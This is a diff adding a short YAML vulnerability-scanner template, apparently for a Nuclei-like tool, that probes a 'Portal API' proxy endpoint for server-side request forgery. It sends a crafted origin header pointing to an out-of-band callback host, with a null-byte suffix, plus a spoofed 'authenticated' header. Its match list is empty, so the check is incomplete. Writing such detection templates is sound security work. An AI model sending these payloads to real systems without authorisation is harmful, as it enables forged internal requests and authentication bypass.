@@ -1,0 +1,20 @@
+id: portal-api-ssrf
+brief:
+    title: Portal API - Server Side Request Forgery
+    by: ishowtess
+    level: high
+    about: A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.
+    label:
+        - ssrf
+        - api
+        - portal
+        - http
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/_proxy/api/v3/portal'
+      head:
+        X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
+        X-Portal-Session-Authenticated: "true"
+      signs: []
